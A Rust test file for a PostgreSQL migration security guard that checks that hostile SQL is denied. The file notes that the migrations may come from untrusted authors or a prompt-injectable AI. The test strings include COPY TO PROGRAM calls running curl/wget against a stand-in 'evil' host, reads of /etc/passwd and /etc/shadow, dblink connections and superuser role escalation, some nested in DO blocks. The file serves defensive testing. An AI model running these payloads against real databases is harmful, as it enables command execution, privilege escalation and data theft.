//! The SQL security guard attack-vector matrix — the security heart (Task 4).
//!
//! Migrations are privileged arbitrary-SQL authored by untrusted creators AND
//! a prompt-injectable AI (design §1.1). The guard is the parse-time first line
//! of defense-in-depth (the least-priv `migrator` role, built later, is the
//! second). Every vector below MUST be denied; the positive controls MUST pass;
//! destructive ops MUST pass but be *flagged* (the gate decides on data loss).
//!
//! The matrix is deliberately exhaustive and goes beyond the plan's list:
//! every RCE / priv-esc / cross-tenant / file-access / SSRF vector we could
//! think of, plus the same vectors nested inside `DO $$…$$` and function
//! bodies (which the guard must inspect, not just top-level statements).

use zeroship_migrate::guard::{flags_for, GuardConfig, GuardError, SqlGuard};

/// A guard whose project schema is `project_acme` and which allowlists only
/// `pgcrypto` + `uuid-ossp` extensions — a realistic per-project config.
fn guard() -> SqlGuard {
    SqlGuard::new(GuardConfig {
        project_schema: "project_acme".to_string(),
        extension_allowlist: vec!["pgcrypto".to_string(), "uuid-ossp".to_string()],
    })
}

/// Assert the SQL is denied (either `Denied` or `CrossSchema`).
#[track_caller]
fn assert_denied(sql: &str) {
    match guard().check(sql) {
        Err(GuardError::Denied { .. } | GuardError::CrossSchema { .. }) => {}
        Err(GuardError::Parse(e)) => panic!("expected Denied, got Parse({e:?}) for: {sql}"),
        Ok(report) => panic!("expected DENY but PASSED for: {sql}\n  report: {report:?}"),
    }
}

/// Assert the SQL is denied specifically as a cross-schema violation.
#[track_caller]
fn assert_cross_schema(sql: &str) {
    match guard().check(sql) {
        Err(GuardError::CrossSchema { .. }) => {}
        other => panic!("expected CrossSchema for: {sql}\n  got: {other:?}"),
    }
}

/// Assert the SQL passes the guard.
#[track_caller]
fn assert_ok(sql: &str) -> zeroship_migrate::guard::GuardReport {
    match guard().check(sql) {
        Ok(report) => report,
        other => panic!("expected OK for: {sql}\n  got: {other:?}"),
    }
}

// ---------------------------------------------------------------------------
// RCE — COPY … PROGRAM (shell execution)
// ---------------------------------------------------------------------------

#[test]
fn copy_to_program_is_rce_denied() {
    assert_denied("COPY project_acme.t TO PROGRAM 'sh -c \"curl evil\"'");
}

#[test]
fn copy_from_program_is_rce_denied() {
    assert_denied("COPY project_acme.t FROM PROGRAM 'wget http://evil/x'");
}

#[test]
fn copy_to_file_is_filesystem_denied() {
    // COPY … TO/FROM a server file is filesystem access, also privileged.
    assert_denied("COPY project_acme.t TO '/etc/cron.d/evil'");
    assert_denied("COPY project_acme.t FROM '/etc/passwd'");
}

#[test]
fn copy_to_stdout_is_allowed() {
    // COPY … TO STDOUT is the client-streaming form — no file, no program.
    assert_ok("COPY project_acme.t TO STDOUT");
}

// ---------------------------------------------------------------------------
// RCE — untrusted procedural languages + LANGUAGE C
// ---------------------------------------------------------------------------

#[test]
fn create_function_plpythonu_denied() {
    assert_denied("CREATE FUNCTION f() RETURNS void LANGUAGE plpythonu AS 'import os'");
}

#[test]
fn create_function_plpython3u_denied() {
    assert_denied("CREATE FUNCTION f() RETURNS void LANGUAGE plpython3u AS 'import os'");
}

#[test]
fn create_function_plperlu_denied() {
    assert_denied("CREATE FUNCTION f() RETURNS void LANGUAGE plperlu AS 'system(\"id\")'");
}

#[test]
fn create_function_pltclu_denied() {
    assert_denied("CREATE FUNCTION f() RETURNS void LANGUAGE pltclu AS 'exec id'");
}

#[test]
fn create_function_language_c_denied() {
    assert_denied("CREATE FUNCTION f() RETURNS int LANGUAGE c AS 'evil.so', 'sym'");
}

#[test]
fn create_function_internal_denied() {
    // LANGUAGE internal can expose internal symbols — untrusted authors must not.
    assert_denied("CREATE FUNCTION f() RETURNS int LANGUAGE internal AS 'int4pl'");
}

#[test]
fn create_trusted_plpgsql_function_is_allowed() {
    assert_ok(
        "CREATE FUNCTION project_acme.bump() RETURNS trigger LANGUAGE plpgsql AS $$ BEGIN RETURN NEW; END $$",
    );
}

#[test]
fn create_sql_function_is_allowed() {
    assert_ok("CREATE FUNCTION project_acme.one() RETURNS int LANGUAGE sql AS 'SELECT 1'");
}

// ---------------------------------------------------------------------------
// RCE / SSRF / file — dangerous CREATE EXTENSION (allowlist enforcement)
// ---------------------------------------------------------------------------

#[test]
fn create_extension_dblink_denied() {
    assert_denied("CREATE EXTENSION dblink");
}

#[test]
fn create_extension_postgres_fdw_denied() {
    assert_denied("CREATE EXTENSION postgres_fdw");
}

#[test]
fn create_extension_file_fdw_denied() {
    assert_denied("CREATE EXTENSION file_fdw");
}

#[test]
fn create_extension_plpythonu_denied() {
    assert_denied("CREATE EXTENSION plpythonu");
}

#[test]
fn create_extension_not_in_allowlist_denied() {
    // Anything not explicitly allowlisted is denied — deny by default.
    assert_denied("CREATE EXTENSION hstore");
    assert_denied("CREATE EXTENSION \"uuid-ossp\" SCHEMA public; CREATE EXTENSION adminpack");
}

#[test]
fn create_allowlisted_extension_is_allowed() {
    assert_ok("CREATE EXTENSION pgcrypto");
    assert_ok("CREATE EXTENSION IF NOT EXISTS \"uuid-ossp\"");
}

// ---------------------------------------------------------------------------
// Privilege escalation — ALTER SYSTEM, roles, grants
// ---------------------------------------------------------------------------

#[test]
fn alter_system_denied() {
    assert_denied("ALTER SYSTEM SET shared_preload_libraries = 'evil'");
    assert_denied("ALTER SYSTEM RESET ALL");
}

#[test]
fn create_role_denied() {
    assert_denied("CREATE ROLE evil");
    assert_denied("CREATE ROLE evil SUPERUSER LOGIN PASSWORD 'x'");
    assert_denied("CREATE USER evil");
}

#[test]
fn alter_role_superuser_denied() {
    assert_denied("ALTER ROLE app_role SUPERUSER");
    assert_denied("ALTER ROLE app_role WITH CREATEROLE");
    assert_denied("ALTER USER app_role PASSWORD 'x'");
}

#[test]
fn drop_role_denied() {
    assert_denied("DROP ROLE app_role");
}

#[test]
fn grant_denied() {
    assert_denied("GRANT SELECT ON project_acme.t TO evil");
    assert_denied("GRANT ALL ON ALL TABLES IN SCHEMA project_acme TO PUBLIC");
}

#[test]
fn grant_role_membership_denied() {
    assert_denied("GRANT pg_read_server_files TO app_role");
    assert_denied("GRANT pg_execute_server_program TO app_role");
    assert_denied("GRANT app_role TO evil");
}

#[test]
fn revoke_denied() {
    // REVOKE is privilege management too — the migrator must not touch ACLs.
    assert_denied("REVOKE ALL ON project_acme.t FROM PUBLIC");
}

#[test]
fn alter_default_privileges_denied() {
    assert_denied(
        "ALTER DEFAULT PRIVILEGES IN SCHEMA project_acme GRANT SELECT ON TABLES TO PUBLIC",
    );
}

// ---------------------------------------------------------------------------
// Cross-tenant — referencing schemas outside the project schema
// ---------------------------------------------------------------------------

#[test]
fn select_control_schema_is_cross_schema() {
    assert_cross_schema("SELECT * FROM control.creator_billing");
}

#[test]
fn insert_auth_schema_is_cross_schema() {
    assert_cross_schema("INSERT INTO auth.users(id) VALUES ('x')");
}

#[test]
fn drop_other_project_schema_is_cross_schema() {
    assert_cross_schema("DROP SCHEMA project_other CASCADE");
}

#[test]
fn create_table_in_foreign_schema_is_cross_schema() {
    assert_cross_schema("CREATE TABLE control.evil(id int)");
}

#[test]
fn update_billing_schema_is_cross_schema() {
    assert_cross_schema("UPDATE billing.invoices SET amount = 0");
}

#[test]
fn join_into_foreign_schema_is_cross_schema() {
    assert_cross_schema(
        "SELECT * FROM project_acme.orders o JOIN control.creator_billing b ON b.id = o.cid",
    );
}

#[test]
fn cte_referencing_foreign_schema_is_cross_schema() {
    assert_cross_schema(
        "WITH x AS (SELECT * FROM auth.users) SELECT * FROM x",
    );
}

#[test]
fn own_schema_qualified_is_allowed() {
    assert_ok("SELECT * FROM project_acme.orders");
    assert_ok("CREATE TABLE project_acme.orders(id int primary key)");
}

#[test]
fn unqualified_object_is_allowed() {
    // Unqualified names resolve via the pinned search_path = project schema;
    // they carry no explicit foreign schema, so the parse check passes (the
    // DB-privilege layer + pinned search_path confine them at runtime).
    assert_ok("CREATE TABLE products(id int primary key)");
    assert_ok("SELECT * FROM products");
}

// ---------------------------------------------------------------------------
// File access — server-side file functions + large objects
// ---------------------------------------------------------------------------

#[test]
fn pg_read_file_denied() {
    assert_denied("SELECT pg_read_file('/etc/passwd')");
}

#[test]
fn pg_read_binary_file_denied() {
    assert_denied("SELECT pg_read_binary_file('/etc/shadow')");
}

#[test]
fn pg_ls_dir_denied() {
    assert_denied("SELECT pg_ls_dir('/')");
}

#[test]
fn lo_import_export_denied() {
    assert_denied("SELECT lo_import('/etc/passwd')");
    assert_denied("SELECT lo_export(1234, '/tmp/leak')");
}

#[test]
fn grant_file_access_roles_denied() {
    assert_denied("GRANT pg_read_server_files TO app_role");
    assert_denied("GRANT pg_write_server_files TO app_role");
}

// ---------------------------------------------------------------------------
// SSRF / reach-other-DBs — dblink functions
// ---------------------------------------------------------------------------

#[test]
fn dblink_connect_denied() {
    assert_denied("SELECT dblink_connect('host=evil dbname=control')");
}

#[test]
fn dblink_exec_denied() {
    assert_denied("SELECT dblink_exec('conn', 'DROP TABLE x')");
}

#[test]
fn dblink_query_denied() {
    assert_denied("SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(x int)");
}

// ---------------------------------------------------------------------------
// search_path escape
// ---------------------------------------------------------------------------

#[test]
fn set_search_path_denied() {
    assert_denied("SET search_path TO control");
    assert_denied("SET search_path = control, public");
    assert_denied("SET LOCAL search_path TO auth");
}

#[test]
fn set_role_denied() {
    assert_denied("SET ROLE postgres");
    assert_denied("SET SESSION AUTHORIZATION postgres");
}

#[test]
fn set_benign_param_allowed() {
    // A benign SET (e.g. a typed-value GUC the migration legitimately needs)
    // is fine — only search_path/role/authorization escapes are denied.
    assert_ok("SET statement_timeout = '5s'");
}

// ---------------------------------------------------------------------------
// Nested inside DO blocks + function bodies — the must-inspect-bodies cases
// ---------------------------------------------------------------------------

#[test]
fn do_block_with_copy_program_denied() {
    assert_denied(
        "DO $$ BEGIN COPY project_acme.t TO PROGRAM 'sh'; END $$",
    );
}

#[test]
fn do_block_with_dblink_denied() {
    assert_denied(
        "DO $$ BEGIN PERFORM dblink_connect('host=evil'); END $$ LANGUAGE plpgsql",
    );
}

#[test]
fn do_block_with_pg_read_file_denied() {
    assert_denied(
        "DO $$ BEGIN PERFORM pg_read_file('/etc/passwd'); END $$",
    );
}

#[test]
fn do_block_with_cross_schema_denied() {
    assert_denied(
        "DO $$ BEGIN INSERT INTO control.creator_billing VALUES (1); END $$",
    );
}

#[test]
fn do_block_with_alter_system_denied() {
    assert_denied("DO $$ BEGIN EXECUTE 'ALTER SYSTEM SET x = 1'; END $$");
}

#[test]
fn do_block_with_set_search_path_denied() {
    assert_denied("DO $$ BEGIN EXECUTE 'SET search_path TO control'; END $$");
}

#[test]
fn do_block_with_create_role_denied() {
    assert_denied("DO $$ BEGIN EXECUTE 'CREATE ROLE evil SUPERUSER'; END $$");
}

#[test]
fn sql_function_body_with_copy_program_denied() {
    // A SQL-language function whose body contains a denied construct.
    assert_denied(
        "CREATE FUNCTION project_acme.f() RETURNS void LANGUAGE sql AS $$ COPY project_acme.t TO PROGRAM 'sh' $$",
    );
}

#[test]
fn plpgsql_function_body_with_dblink_denied() {
    assert_denied(
        "CREATE FUNCTION project_acme.f() RETURNS void LANGUAGE plpgsql AS $$ BEGIN PERFORM dblink('host=evil','SELECT 1'); END $$",
    );
}

#[test]
fn plpgsql_function_body_with_cross_schema_denied() {
    assert_denied(
        "CREATE FUNCTION project_acme.f() RETURNS void LANGUAGE plpgsql AS $$ BEGIN DELETE FROM auth.users; END $$",
    );
}

#[test]
fn benign_plpgsql_function_body_is_allowed() {
    assert_ok(
        "CREATE FUNCTION project_acme.touch() RETURNS trigger LANGUAGE plpgsql AS $$ BEGIN NEW.updated_at = now(); RETURN NEW; END $$",
    );
}

// ---------------------------------------------------------------------------
// CALL of a procedure can run arbitrary statements — treat as body-bearing
// ---------------------------------------------------------------------------

#[test]
fn unparseable_sql_is_denied_not_panicked() {
    // Deny-by-default: SQL the parser rejects never reaches the DB.
    match guard().check("this is &^% not valid sql") {
        Err(GuardError::Parse(_) | GuardError::Denied { .. }) => {}
        other => panic!("unparseable SQL must be rejected, got {other:?}"),
    }
}

// ---------------------------------------------------------------------------
// Positive controls — safe DDL must PASS, report ok
// ---------------------------------------------------------------------------

#[test]
fn safe_create_table_passes() {
    let r = assert_ok("CREATE TABLE products(id int primary key, name text, price numeric)");
    assert!(!r.destructive, "CREATE TABLE is not destructive");
}

#[test]
fn safe_add_column_passes() {
    let r = assert_ok("ALTER TABLE products ADD COLUMN sku text");
    assert!(!r.destructive);
}

#[test]
fn safe_create_index_concurrently_passes() {
    let r = assert_ok("CREATE INDEX CONCURRENTLY idx_sku ON products(sku)");
    assert!(!r.destructive);
    assert!(
        r.classes.iter().any(|c| c.non_transactional),
        "CONCURRENTLY must be flagged non-transactional in the report"
    );
}

#[test]
fn safe_add_constraint_passes() {
    assert_ok("ALTER TABLE products ADD CONSTRAINT chk_price CHECK (price >= 0)");
}

#[test]
fn safe_multi_statement_migration_passes() {
    assert_ok(
        "CREATE TABLE orders(id int primary key);
         ALTER TABLE orders ADD COLUMN total numeric;
         CREATE INDEX idx_total ON orders(total);",
    );
}

// ---------------------------------------------------------------------------
// Destructive — must PASS but report.destructive == true
// ---------------------------------------------------------------------------

#[test]
fn drop_table_passes_but_flagged_destructive() {
    let r = assert_ok("DROP TABLE products");
    assert!(r.destructive, "DROP TABLE must be flagged destructive (gate decides)");
}

#[test]
fn drop_column_passes_but_flagged_destructive() {
    let r = assert_ok("ALTER TABLE products DROP COLUMN sku");
    assert!(r.destructive, "DROP COLUMN must be flagged destructive");
}

#[test]
fn truncate_passes_but_flagged_destructive() {
    let r = assert_ok("TRUNCATE products");
    assert!(r.destructive, "TRUNCATE must be flagged destructive");
}

#[test]
fn alter_column_type_passes_but_flagged_destructive() {
    let r = assert_ok("ALTER TABLE products ALTER COLUMN price TYPE bigint");
    assert!(r.destructive, "type change is potentially-lossy → flagged");
}

#[test]
fn drop_constraint_passes_but_flagged_destructive() {
    let r = assert_ok("ALTER TABLE products DROP CONSTRAINT chk_price");
    assert!(r.destructive);
}

#[test]
fn mixed_migration_with_a_drop_is_flagged_but_passes() {
    // Additive + a drop: passes (no denied construct) but flagged destructive.
    let r = assert_ok(
        "CREATE TABLE t2(id int); DROP TABLE old_table;",
    );
    assert!(r.destructive);
}

// ---------------------------------------------------------------------------
// Task 5 — lint warnings + flags_for mapping
// ---------------------------------------------------------------------------

#[test]
fn add_not_null_volatile_default_warns_lock() {
    // ADD COLUMN NOT NULL DEFAULT <volatile> forces a full table rewrite under
    // an ACCESS EXCLUSIVE lock — lint must warn (not deny).
    let r = assert_ok("ALTER TABLE products ADD COLUMN created_at timestamptz NOT NULL DEFAULT now()");
    assert!(
        r.warnings.iter().any(|w| w.to_lowercase().contains("lock")
            || w.to_lowercase().contains("rewrite")),
        "expected a lock/rewrite warning, got: {:?}",
        r.warnings
    );
}

#[test]
fn add_not_null_constant_default_does_not_warn() {
    // A constant default is the PG11+ metadata-only fast path — no warning.
    let r = assert_ok("ALTER TABLE products ADD COLUMN active boolean NOT NULL DEFAULT true");
    assert!(
        !r.warnings.iter().any(|w| w.to_lowercase().contains("lock")),
        "constant default must not warn, got: {:?}",
        r.warnings
    );
}

#[test]
fn non_concurrent_create_index_warns() {
    // A plain CREATE INDEX takes a write lock for the build — warn to suggest
    // CONCURRENTLY.
    let r = assert_ok("CREATE INDEX idx_name ON products(name)");
    assert!(
        r.warnings.iter().any(|w| w.to_lowercase().contains("concurrently")),
        "expected a CONCURRENTLY suggestion, got: {:?}",
        r.warnings
    );
}

#[test]
fn concurrent_create_index_does_not_warn_concurrently() {
    let r = assert_ok("CREATE INDEX CONCURRENTLY idx_name ON products(name)");
    assert!(
        !r.warnings.iter().any(|w| w.to_lowercase().contains("concurrently")),
        "CONCURRENTLY index must not get a CONCURRENTLY warning, got: {:?}",
        r.warnings
    );
}

#[test]
fn flags_for_destructive_requires_approval() {
    let r = assert_ok("DROP TABLE products");
    let flags = flags_for(&r);
    assert!(r.destructive);
    assert!(flags.requires_approval, "destructive ⇒ requires_approval");
    assert!(flags.destructive);
}

#[test]
fn flags_for_safe_additive_does_not_require_approval() {
    let r = assert_ok("CREATE TABLE products(id int primary key)");
    let flags = flags_for(&r);
    assert!(!flags.requires_approval, "additive ⇒ no approval needed");
    assert!(!flags.destructive);
    assert!(flags.transactional, "default additive migration is transactional");
}

#[test]
fn flags_for_non_transactional_sets_transactional_false() {
    let r = assert_ok("CREATE INDEX CONCURRENTLY idx ON products(name)");
    let flags = flags_for(&r);
    assert!(
        !flags.transactional,
        "a CONCURRENTLY migration must be marked non-transactional"
    );
}
